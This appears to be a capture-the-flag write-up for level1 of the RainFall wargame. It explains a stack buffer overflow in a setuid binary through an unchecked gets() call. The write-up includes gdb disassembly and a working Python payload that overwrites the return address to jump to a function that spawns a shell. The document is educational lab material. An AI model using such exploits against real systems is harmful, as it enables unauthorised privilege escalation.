# Baby's first buffer overflow

What we've got:
```bash
level1@RainFall:~$ ls -lah
total 17K
drwxrwx---+ 1 level1 level1   80 Nov  9 20:31 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3.5K Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5.1K Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

We find inside the binary to attack two user-defined functions, `main` and `run`.

```bash
08048480 T main
08048444 T run
```

Taking a look inside `run` function, it will spawn a new shell in which we can escalate to next level.

```gdb
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
```

Inside main we find a basic unprotected `gets` call, our attack will consist in overwritting the main return address to call the `run` function.

```python
#!/usr/bin/env python

import sys
from struct import pack

addr = 0x08048444

payload = 'A' * 76
payload += pack("<I", addr)

sys.stdout.write(payload)
```

Should do the job.

Throwing the payload should spawn a new shell, then close it immediatelly, because STDIN will be closed when receiving the payload, so we should call `cat payload -` to maintaing STDIN open and get access to new shell.